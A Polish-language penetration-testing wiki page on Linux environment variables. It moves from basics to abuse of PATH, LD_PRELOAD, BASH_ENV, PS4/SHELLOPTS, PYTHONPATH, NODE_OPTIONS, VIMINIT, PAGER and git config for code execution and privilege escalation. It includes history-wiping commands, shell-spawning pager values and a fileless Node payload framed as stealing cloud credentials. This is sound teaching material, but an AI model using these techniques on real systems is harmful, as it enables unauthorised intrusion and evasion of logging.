# Zmienne środowiskowe Linux

{{#include ../../banners/hacktricks-training.md}}

## Zmienne globalne

Zmienne globalne **będą** dziedziczone przez **procesy potomne**.

Możesz utworzyć zmienną globalną dla bieżącej sesji, wykonując:
```bash
export MYGLOBAL="hello world"
echo $MYGLOBAL #Prints: hello world
```
Ta zmienna będzie dostępna dla bieżących sesji i ich procesów potomnych.

Możesz **usunąć** zmienną za pomocą:
```bash
unset MYGLOBAL
```
## Zmienne lokalne

Do **zmiennych lokalnych** można uzyskać dostęp wyłącznie z poziomu **bieżącej powłoki/skryptu**.
```bash
LOCAL="my local"
echo $LOCAL
unset LOCAL
```
## Lista bieżących zmiennych
```bash
set
env
printenv
cat /proc/$$/environ
cat /proc/`python -c "import os; print(os.getppid())"`/environ
```
Zawartość `/proc/*/environ` jest **rozdzielona znakami NUL**, dlatego te warianty są zazwyczaj łatwiejsze do odczytania:
```bash
tr '\0' '\n' </proc/$$/environ | sort -u
tr '\0' '\n' </proc/<PID>/environ | sort -u
```
Jeśli szukasz **credentials** lub **interesującej konfiguracji usług** w odziedziczonych środowiskach, sprawdź również [Linux Post Exploitation](../post-exploitation/linux-post-exploitation/README.md).

## Typowe zmienne

Źródło: [https://geek-university.com/linux/common-environment-variables/](https://geek-university.com/linux/common-environment-variables/).<sup>[[5]](#references)</sup>

- **DISPLAY** – ekran używany przez **X**. Ta zmienna jest zwykle ustawiona na **:0.0**, co oznacza pierwszy ekran na bieżącym komputerze.
- **EDITOR** – preferowany edytor tekstu użytkownika.
- **HISTFILESIZE** – maksymalna liczba wierszy zawartych w pliku historii.
- **HISTSIZE** – liczba wierszy dodawanych do pliku historii po zakończeniu sesji przez użytkownika.
- **HOME** – katalog domowy użytkownika.
- **HOSTNAME** – hostname komputera.
- **LANG** – bieżący język.
- **MAIL** – lokalizacja mail spool użytkownika. Zwykle **/var/spool/mail/USER**.
- **MANPATH** – lista katalogów przeszukiwanych w celu znalezienia stron podręcznika.
- **OSTYPE** – typ systemu operacyjnego.
- **PS1** – domyślny prompt w bash.
- **PATH** – przechowuje ścieżki wszystkich katalogów zawierających pliki binarne, które chcesz uruchamiać przez samo podanie nazwy pliku, a nie ścieżki względnej lub bezwzględnej.
- **PWD** – bieżący katalog roboczy.
- **SHELL** – ścieżka do bieżącej powłoki poleceń (na przykład **/bin/bash**).
- **TERM** – bieżący typ terminala (na przykład **xterm**).
- **TZ** – strefa czasowa użytkownika.
- **USER** – bieżąca nazwa użytkownika.

## Interesujące zmienne dla hacking

Nie każda zmienna jest równie użyteczna. Z perspektywy ofensywnej należy priorytetowo traktować zmienne, które zmieniają **ścieżki wyszukiwania**, **pliki startowe**, **zachowanie dynamicznego linkera** lub **audytowanie/logowanie**.

### **HISTFILESIZE**

Zmień **wartość tej zmiennej na 0**, aby po **zakończeniu sesji** **plik historii** (\~/.bash_history) został **skrócony do 0 wierszy**.
```bash
export HISTFILESIZE=0
```
### **HISTSIZE**

Zmień **wartość tej zmiennej na 0**, aby polecenia **nie były przechowywane w historii w pamięci** ani zapisywane z powrotem do **pliku historii** (\~/.bash_history).
```bash
export HISTSIZE=0
```
### **HISTCONTROL**

Jeśli **wartość tej zmiennej jest ustawiona na `ignorespace` lub `ignoreboth`**, każde polecenie poprzedzone dodatkową spacją nie zostanie zapisane w historii.
```bash
export HISTCONTROL=ignorespace
```

```bash
$ echo "to save or"
$  echo "not to save"
```
### **HISTFILE**

Wskaż **plik historii** na **`/dev/null`** lub całkowicie go wyłącz. Zwykle jest to bardziej niezawodne niż samo zmienianie rozmiaru historii.
```bash
export HISTFILE=/dev/null
unset HISTFILE
```
### http_proxy & https_proxy

Procesy będą używać zadeklarowanego tutaj **proxy**, aby łączyć się z internetem przez **http lub https**.
```bash
export http_proxy="http://10.10.10.10:8080"
export https_proxy="http://10.10.10.10:8080"
```
### all_proxy i no_proxy

- `all_proxy`: domyślny proxy dla narzędzi/protokołów, które go respektują.
- `no_proxy`: lista wyjątków (hosty/domeny/CIDR), które powinny łączyć się bezpośrednio.
```bash
export all_proxy="socks5h://10.10.10.10:1080"
export no_proxy="localhost,127.0.0.1,.corp.local,10.0.0.0/8"
```
W zależności od narzędzia mogą być używane zarówno warianty pisane małymi, jak i wielkimi literami (`http_proxy`/`HTTP_PROXY`, `no_proxy`/`NO_PROXY`).

### SSL_CERT_FILE & SSL_CERT_DIR

Procesy będą ufać certyfikatom wskazanym w **tych zmiennych środowiskowych**. Jest to przydatne do sprawienia, aby narzędzia takie jak **`curl`**, **`git`**, klienci HTTP w Pythonie lub menedżery pakietów ufały urzędu certyfikacji kontrolowanemu przez atakującego (na przykład w celu sprawienia, aby proxy przechwytujące wyglądało na legalne).
```bash
export SSL_CERT_FILE=/path/to/ca-bundle.pem
export SSL_CERT_DIR=/path/to/ca-certificates
```
### **PATH**

Jeśli uprzywilejowany wrapper/skrypt wykonuje polecenia **bez ścieżek absolutnych**, wygrywa **pierwszy kontrolowany przez atakującego katalog** w `PATH`. Jest to mechanizm stojący za wieloma **PATH hijacks** w `sudo`, zadaniach cron, wrapperach powłoki i niestandardowych helperach SUID. Szukaj `env_keep+=PATH`, słabego `secure_path` lub wrapperów, które wywołują `tar`, `service`, `cp`, `python` itp. po nazwie.
```bash
mkdir -p /dev/shm/bin
cat > /dev/shm/bin/tar <<'EOF'
#!/bin/sh
echo '[+] PATH hijack reached' >&2
id
EOF
chmod +x /dev/shm/bin/tar
PATH=/dev/shm/bin:$PATH vulnerable-wrapper
```
W przypadku pełnych łańcuchów eskalacji uprawnień wykorzystujących `PATH` sprawdź [Linux Privilege Escalation](linux-privilege-escalation/README.md).

### **HOME & XDG_CONFIG_HOME**

`HOME` to nie tylko odwołanie do katalogu: wiele narzędzi automatycznie ładuje **dotfiles**, **plugins** i **konfigurację użytkownika** z `$HOME` lub `$XDG_CONFIG_HOME`. Jeśli uprzywilejowany workflow zachowuje te wartości, **config injection** może być łatwiejszy niż **binary hijacking**.
```bash
export HOME=/dev/shm/fakehome
export XDG_CONFIG_HOME=/dev/shm/fakehome/.config
mkdir -p "$XDG_CONFIG_HOME"
```
Interesujące cele obejmują `.gitconfig`, `.wgetrc`, `.curlrc`, `.inputrc`, `.pythonrc.py` oraz pliki specyficzne dla narzędzi, takie jak `.terraformrc`.

### **LD_PRELOAD, LD_LIBRARY_PATH & LD_AUDIT**

Zmienne te wpływają na **dynamic linker**:

- `LD_PRELOAD`: wymusza wcześniejsze załadowanie dodatkowych obiektów współdzielonych.
- `LD_LIBRARY_PATH`: dodaje na początku listę katalogów przeszukiwanych w poszukiwaniu bibliotek.
- `LD_AUDIT`: ładuje biblioteki audytujące, które monitorują ładowanie bibliotek i rozwiązywanie symboli.

Są niezwykle przydatne do **hooking**, **instrumentation** i **privilege escalation**, jeśli uprzywilejowane polecenie zachowuje te zmienne. W trybie **secure-execution** (`AT_SECURE`, np. setuid/setgid/capabilities) loader usuwa lub ogranicza wiele z tych zmiennych. Jednak parser bugs na tym wczesnym etapie działania loadera nadal mają duży wpływ, ponieważ uruchamiają się **przed** programem docelowym.<sup>[[2]](#references)</sup>
```bash
env | grep -E '^LD_'
ldso=$(ls /lib64/ld-linux-*.so.* /lib/*-linux-gnu/ld-linux-*.so.* 2>/dev/null | head -n1)
"$ldso" --list-diagnostics /bin/true | head
"$ldso" --list-tunables /bin/true | head
```
### **GLIBC_TUNABLES**

`GLIBC_TUNABLES` zmienia wczesne zachowanie glibc (na przykład ustawienia allocator) i jest bardzo przydatna w exploit labs. Ma również znaczenie z perspektywy bezpieczeństwa, ponieważ **dynamiczny loader analizuje ją bardzo wcześnie**. Błąd **Looney Tunables** z 2023 roku był dobrym przypomnieniem, że pojedyncza zmienna środowiskowa analizowana przez loader może stać się **prymitywem lokalnej eskalacji uprawnień** w przypadku programów SUID.<sup>[[6]](#references)</sup>
```bash
GLIBC_TUNABLES=glibc.malloc.tcache_count=0 ./binary
```
### **BASH_ENV & ENV**

Jeśli **Bash** jest uruchamiany **nieinteraktywnie**, sprawdza `BASH_ENV` i ładuje wskazany plik przed uruchomieniem docelowego skryptu. Gdy Bash jest wywoływany jako `sh` lub działa w interaktywnym trybie POSIX, może również sprawdzać `ENV`. Jest to klasyczny sposób na przekształcenie wrappera powłoki w wykonanie kodu, jeśli środowisko jest kontrolowane przez atakującego.
```bash
cat > /tmp/pre.sh <<'EOF'
echo '[+] sourced before the target script'
EOF
BASH_ENV=/tmp/pre.sh bash -c 'echo target'
```
Bash ignoruje te pliki startowe, gdy **rzeczywiste/efektywne identyfikatory różnią się**; `-p` zachowuje efektywny identyfikator, ale nie włącza tych plików startowych, więc dokładne zachowanie zależy od sposobu, w jaki wrapper uruchamia powłokę. Należy uważać na uprzywilejowane wrappery, które wywołują `setuid()`/`setgid()` **przed** uruchomieniem Bash: gdy identyfikatory ponownie będą zgodne, Bash może zaufać `BASH_ENV`, `ENV` i powiązanemu stanowi powłoki, które w przeciwnym razie zostałyby zignorowane.<sup>[[1]](#references)</sup>

### **PS4 + SHELLOPTS (xtrace)**

Gdy Bash działa z włączonym **xtrace**, rozwija `PS4` i wyświetla jego wartość przed każdym śledzonym poleceniem. `PS4` jest rozwijane jak prompt, więc znajdujące się w nim **podstawienie polecenia** zostaje wykonane. Co najważniejsze, xtrace można włączyć wyłącznie z poziomu środowiska, eksportując `SHELLOPTS=xtrace` — nie jest potrzebne `-x` w wierszu poleceń — dzięki czemu dowolny skrypt Bash uruchomiony przez ofiarę staje się wykonaniem kodu.<sup>[[7]](#references)</sup>
```bash
echo 'echo target' > /tmp/victim.sh

# Pure environment-variable injection (no -x flag)
SHELLOPTS=xtrace PS4='$(id > /tmp/ps4-executed)' bash /tmp/victim.sh
cat /tmp/ps4-executed

# Same primitive when a job is run with debugging enabled
PS4='$(touch /tmp/ps4-x)' bash -x /tmp/victim.sh
```
`PS4` nie robi nic, dopóki xtrace nie jest aktywne (`SHELLOPTS=xtrace`, `set -x` lub `bash -x`), a Bash usuwa `SHELLOPTS` w kontekstach uprzywilejowanych/setuid, podobnie jak `BASH_ENV`.

### **PYTHONPATH, PYTHONHOME, PYTHONSTARTUP, PYTHONINSPECT & PYTHONBREAKPOINT**

Te zmienne zmieniają sposób uruchamiania Pythona:

- `PYTHONPATH`: dodaje ścieżki wyszukiwania importów na początku.
- `PYTHONHOME`: zmienia lokalizację drzewa biblioteki standardowej.
- `PYTHONSTARTUP`: wykonuje plik przed wyświetleniem interaktywnego promptu.
- `PYTHONINSPECT=1`: przechodzi do trybu interaktywnego po zakończeniu działania skryptu.
- `PYTHONBREAKPOINT`: `package.module.callable` jest wywoływane (a jego moduł importowany), gdy kod dociera do `breakpoint()`.<sup>[[8]](#references)</sup>

Są przydatne przeciwko skryptom utrzymaniowym, debuggerom, shellom i wrapperom, które wywołują Pythona ze środowiskiem, nad którym mamy kontrolę. `python -E` i `python -I` ignorują wszystkie zmienne `PYTHON*`.
```bash
mkdir -p /tmp/pylib
printf 'print("owned from PYTHONPATH")\n' > /tmp/pylib/htmod.py
PYTHONPATH=/tmp/pylib python3 -c 'import htmod'
PYTHONPATH=/tmp/pylib python3 -I -c 'import htmod'   # ignored in isolated mode

# PYTHONBREAKPOINT: runs when the target reaches breakpoint()
printf 'import sys\nbreakpoint(*sys.argv[1:])\n' > /tmp/bp.py
PYTHONBREAKPOINT='os.system' python3 /tmp/bp.py 'id'   # requires the code to hit breakpoint()
```
Niedawnym przykładem z rzeczywistego świata było **needrestart** LPE z 2024 roku w systemach Ubuntu/Debian: skaner należący do roota kopiował `PYTHONPATH` nieuprzywilejowanego procesu z `/proc/<PID>/environ`, a następnie uruchamiał Python. Opublikowany exploit umieszczał `importlib/__init__.so` w ścieżce kontrolowanej przez atakującego, dzięki czemu Python wykonywał kod atakującego podczas własnej inicjalizacji, zanim w ogóle miało znaczenie użycie przez helpera skryptu na sztywno wpisanego w kod.<sup>[[3]](#references)</sup>

### **PERL5OPT & PERL5LIB**

Perl ma równie przydatne zmienne startowe:

- `PERL5LIB`: dodaje katalogi bibliotek na początku ścieżki.
- `PERL5OPT`: wstrzykuje przełączniki tak, jakby znajdowały się w każdym wierszu poleceń `perl`.

Może to wymusić **automatyczne ładowanie modułów** lub zmienić zachowanie interpretera, zanim docelowy skrypt zrobi cokolwiek interesującego. Perl ignoruje te zmienne w kontekstach **taint / setuid / setgid**, ale nadal mają one duże znaczenie w przypadku zwykłych wrapperów uruchamianych jako root, zadań CI, instalatorów i niestandardowych reguł sudoers.
```bash
mkdir -p /tmp/perllib
cat > /tmp/perllib/HT.pm <<'EOF'
package HT;
BEGIN { print "PERL5OPT_TRIGGERED\n" }
1;
EOF
PERL5LIB=/tmp/perllib PERL5OPT=-MHT perl -e 'print "target\n"'
```
### **NODE_OPTIONS**

`NODE_OPTIONS` dodaje **flagi CLI Node.js** do każdego procesu `node`, który dziedziczy środowisko. Dzięki temu jest przydatne przeciwko wrapperom, zadaniom CI, helperom Electron oraz regułom sudo, które ostatecznie uruchamiają Node. Z ofensywnego punktu widzenia najciekawsze flagi to zazwyczaj:

- `--require <file>`: wstępnie ładuje plik CommonJS przed skryptem docelowym.
- `--import <module>`: wstępnie ładuje moduł ES przed skryptem docelowym.

Node odrzuca niektóre niebezpieczne flagi w `NODE_OPTIONS`, ale `--require` i `--import` są jawnie dozwolone i przetwarzane **przed** standardowymi argumentami wiersza poleceń.<sup>[[4]](#references)</sup>
```bash
cat > /tmp/preload.js <<'EOF'
console.error('[+] NODE_OPTIONS preload reached')
EOF
NODE_OPTIONS='--require /tmp/preload.js' node -e 'console.log("target")'
```
#### Bezplikowe preloadowanie z użyciem adresu URL `data:`

Gdy możesz ustawić `NODE_OPTIONS`, ale **nie możesz zapisać pliku** na hoście docelowym (system plików tylko do odczytu, ograniczone API, środowisko serverless itd.), `--import` akceptuje adres URL `data:text/javascript,`, więc cały payload znajduje się bezpośrednio w samej zmiennej środowiskowej. Kod JavaScript musi być **w pełni zakodowany w URL** — Node parsuje tę wartość jako adres URL, więc dowolna surowa spacja (lub inny niezakodowany znak) obcina payload i powoduje błąd `SyntaxError`. Działa to w Node 20.6+, gdzie `--import` znajduje się na allowlist `NODE_OPTIONS`.<sup>[[4]](#references)</sup>
```bash
# fileless proof of execution (note: no raw spaces in the data URL)
NODE_OPTIONS='--import data:text/javascript,console.log(%22fileless_preload%22)' node -e 'console.log("target")'

# Real payload, URL-encoded (run a command / exfiltrate env vars)
PAYLOAD=$(python3 - <<'PY'
import urllib.parse
js = "import('child_process').then(cp=>console.log(cp.execSync('id').toString()))"
print("--import data:text/javascript," + urllib.parse.quote(js, safe=""))
PY
)
NODE_OPTIONS="$PAYLOAD" node -e 'console.log("target")'
```
> [!TIP]
> Jest to powszechny sposób przekształcenia kontroli nad `NODE_OPTIONS` w RCE w **zarządzanych środowiskach cloud**, których funkcje uruchamiają Node. Na przykład atakujący, który może jedynie zmienić konfigurację Lambdy (`lambda:UpdateFunctionConfiguration`, bez `iam:PassRole` i bez aktualizacji kodu), może wstrzyknąć `NODE_OPTIONS=--import data:text/javascript,<payload>`, aby uruchomić kod wewnątrz funkcji i wykraść poświadczenia jej execution role. Wstrzyknięty moduł uruchamia się **przed** handlerem, który następnie nadal wykonuje się normalnie.

W przypadku zdalnych gadget chains, które pośrednio ustawiają `NODE_OPTIONS` (na przykład prototype pollution prowadzącego do RCE), sprawdź [tę inną stronę](../../pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce.md).

### **RUBYLIB i RUBYOPT**

Ruby oferuje tę samą klasę nadużyć podczas uruchamiania:

- `RUBYLIB`: dodaje katalogi na początku ścieżki ładowania Ruby.
- `RUBYOPT`: wstrzykuje opcje wiersza poleceń, takie jak `-r`, do każdego wywołania `ruby`.
```bash
mkdir -p /tmp/rubylib
printf 'warn "[+] RUBYOPT preload reached"\n' > /tmp/rubylib/ht.rb
RUBYLIB=/tmp/rubylib RUBYOPT='-rht' ruby -e 'puts :target'
```
Wykorzystanie podatności w **needrestart** z 2024 roku pokazało, że nie jest to tylko sztuczka laboratoryjna: ten sam helper należący do użytkownika root, który był podatny na nadużycie `PYTHONPATH`, można było również zmusić do uruchomienia Ruby ze sterowanym przez atakującego `RUBYLIB`, ładując `enc/encdb.so` z katalogu atakującego.<sup>[[3]](#references)</sup>

### **VIMINIT & EXINIT**

Vim/Neovim wykonują komendy Ex zawarte w `VIMINIT` (lub w jego zapasowym odpowiedniku `EXINIT`) podczas normalnego uruchamiania. Komendy Ex obejmują `:!cmd` i `:call system(...)`, więc przejęcie kontroli nad tą zmienną umożliwia wykonanie kodu za każdym razem, gdy ofiara otworzy Vim (`sudo vim` jako root, `crontab -e`, `visudo`, `git`/`less` uruchamiające `$EDITOR` itd.).<sup>[[9]](#references)</sup>
```bash
echo hi > /tmp/victim.txt
printf ':qa!\n' | VIMINIT='silent! !touch /tmp/vim-executed' vim /tmp/victim.txt
test -e /tmp/vim-executed && echo 'VIMINIT executed'
```
Tryb wsadowy (`vim -es`/`-Es`) pomija te zmienne, ale podczas zwykłego uruchamiania interaktywnego są one wykonywane.

### **PowerShell (pwsh): PSModulePath, DOTNET_STARTUP_HOOKS i CLR profiler**

PowerShell Core (`pwsh`) działa na Linux/macOS (oraz Windows) i jest **aplikacją .NET**, dlatego kilka zmiennych środowiskowych może zamienić każde wywołanie `pwsh` z odziedziczonym środowiskiem w code execution — jest to przydatne w przypadku zadań cron/systemd, CI runnerów oraz uprzywilejowanych wrapperów uruchamiających `pwsh`.

- `PSModulePath`: PowerShell rekurencyjnie przeszukuje każdy katalog z tej listy w poszukiwaniu modułów `.psd1`/`.psm1` i **automatycznie ładuje** moduł przy pierwszym odwołaniu do eksportowanego przez niego polecenia. Dodaj katalog na początku listy, a kod z najwyższego poziomu modułu zostanie uruchomiony podczas importu; ponieważ rozwiązywanie przebiega w kolejności *Alias → Function → Cmdlet*, eksportowana funkcja może nawet przesłonić wbudowany cmdlet wywoływany przez ofiarę.<sup>[[10]](#references)</sup>
- `XDG_CONFIG_HOME`: przenosi `powershell/Microsoft.PowerShell_profile.ps1`, wykonywany podczas uruchamiania (o ile nie użyto `-NoProfile`).
- `DOTNET_STARTUP_HOOKS`: zarządzane assembly, którego `StartupHook.Initialize()` jest uruchamiane przed `Main` (współdzielone przez każdą aplikację .NET).
- `CORECLR_ENABLE_PROFILING=1` + `CORECLR_PROFILER={guid}` + `CORECLR_PROFILER_PATH=/path/evil.so`: API profilowania CLR ładuje bibliotekę atakującego do procesu podczas uruchamiania (zmienne ścieżek mają pierwszeństwo przed rejestrem; `DOTNET_*` to nowszy alias). W Windows PowerShell 5.1 (.NET Framework) użyj `COR_ENABLE_PROFILING`/`COR_PROFILER`/`COR_PROFILER_PATH`. MITRE ATT&CK T1574.012.<sup>[[11]](#references)</sup>
```bash
# PSModulePath module auto-load hijack
mkdir -p /tmp/evil/Hijack
printf 'New-Item -ItemType File /tmp/ps-mod-exec -Force|Out-Null\nfunction Invoke-Report{}\nExport-ModuleMember -Function Invoke-Report\n' > /tmp/evil/Hijack/Hijack.psm1
printf "@{ModuleVersion='1.0';RootModule='Hijack.psm1';FunctionsToExport=@('Invoke-Report')}\n" > /tmp/evil/Hijack/Hijack.psd1
PSModulePath="/tmp/evil:$PSModulePath" pwsh -Command 'Invoke-Report'
test -e /tmp/ps-mod-exec && echo 'PSModulePath auto-load executed'
```
W systemie Windows `PSExecutionPolicyPreference=Bypass` dodatkowo usuwa zabezpieczenie „unsigned scripts blocked”, dzięki czemu umieszczony profile/module faktycznie się uruchamia. Zobacz dedykowaną stronę zawierającą pełne PoC:

{{#ref}}
../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-powershell-applications-injection.md
{{#endref}}

### **PAGER, MANPAGER, GIT_PAGER, GIT_EDITOR & LESSOPEN**

Niektóre narzędzia nie tylko odczytują ścieżkę ze środowiska — przekazują wartość do **shell**, **editor** lub **input preprocessor**. Sprawia to, że poniższe zmienne są szczególnie interesujące, gdy uprzywilejowany wrapper uruchamia `git`, `man`, `less` lub podobne przeglądarki tekstu:

- `PAGER`, `MANPAGER`, `GIT_PAGER`: wybierają polecenie pagera.
- `GIT_EDITOR`, `VISUAL`, `EDITOR`: wybierają polecenie edytora, często wraz z argumentami.
- `LESSOPEN`, `LESSCLOSE`: definiują pre/post-processors uruchamiane, gdy `less` otwiera plik.
```bash
PAGER='sh -c "exec sh 0<&1 1>&1"' man man

cat > /tmp/lesspipe.sh <<'EOF'
#!/bin/sh
echo '[+] LESSOPEN triggered' >&2
cat "$1"
EOF
chmod +x /tmp/lesspipe.sh
LESSOPEN='|/tmp/lesspipe.sh %s' less /etc/hosts
```
Git obsługuje również **wstrzykiwanie konfiguracji wyłącznie za pomocą zmiennych środowiskowych** bez zapisywania czegokolwiek na dysku za pomocą `GIT_CONFIG_COUNT`, `GIT_CONFIG_KEY_<n>` i `GIT_CONFIG_VALUE_<n>`:
```bash
GIT_CONFIG_COUNT=1 \
GIT_CONFIG_KEY_0=core.pager \
GIT_CONFIG_VALUE_0='sh -c "exec sh 0<&1 1>&1"' \
git -p help
```
Z perspektywy post-exploitation pamiętaj również, że odziedziczone środowiska często zawierają **credentials**, **ustawienia proxy**, **service tokens** lub **cloud keys**. Sprawdź [Linux Post Exploitation](../post-exploitation/linux-post-exploitation/README.md), aby poznać `/proc/<PID>/environ` oraz wyszukiwanie `Environment=` w `systemd`.

### PS1

Zmień wygląd swojego promptu.

[**To jest przykład**](https://gist.github.com/carlospolop/43f7cd50f3deea972439af3222b68808)

Root:

![PERL5OPT & PERL5LIB - PS1: To jest przykład](<../images/image (897).png>)

Zwykły użytkownik:

![PERL5OPT & PERL5LIB - PS1: Jedno, dwa i trzy zadania w tle](<../images/image (740).png>)

Jedno, dwa i trzy zadania w tle:

![PERL5OPT & PERL5LIB - PS1: Jedno, dwa i trzy zadania w tle](<../images/image (145).png>)

Jedno zadanie w tle, jedno zatrzymane, a ostatnie polecenie nie zakończyło się poprawnie:

![PERL5OPT & PERL5LIB - PS1: Jedno zadanie w tle, jedno zatrzymane, a ostatnie polecenie nie zakończyło się poprawnie](<../images/image (715).png>)

## References

- [1] [Podręcznik GNU Bash - Pliki startowe Bash](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html)
- [2] [ld.so(8) - strona podręcznika Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [3] [Qualys - LPE w needrestart](https://www.qualys.com/2024/11/19/needrestart/needrestart.txt)
- [4] [Dokumentacja Node.js CLI - `NODE_OPTIONS`](https://nodejs.org/api/cli.html)
- [5] [Popularne zmienne środowiskowe - Geek University](https://geek-university.com/linux/common-environment-variables/)
- [6] [CVE-2023-4911: Looney Tunables - Local Privilege Escalation w ld.so biblioteki glibc - Qualys](https://blog.qualys.com/vulnerabilities-threat-research/2023/10/03/cve-2023-4911-looney-tunables-local-privilege-escalation-in-the-glibcs-ld-so)
- [7] [Podręcznik GNU Bash - zmienne Bash (`PS4`) i wbudowane polecenie Set (`xtrace`/`SHELLOPTS`)](https://www.gnu.org/software/bash/manual/html_node/Bash-Variables.html)
- [8] [PEP 553 - Wbudowane breakpoint() i PYTHONBREAKPOINT](https://peps.python.org/pep-0553/)
- [9] [Dokumentacja Vim - starting.txt (`VIMINIT`, `EXINIT`)](https://vimhelp.org/starting.txt.html#initialization)
- [10] [about_PSModulePath i automatyczne ładowanie modułów PowerShell](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_psmodulepath)
- [11] [Konfiguracja debugowania i profilowania .NET (zmienne profilera `CORECLR_`/`DOTNET_`/`COR_`)](https://learn.microsoft.com/en-us/dotnet/core/runtime-config/debugging-profiling)
{{#include ../../banners/hacktricks-training.md}}
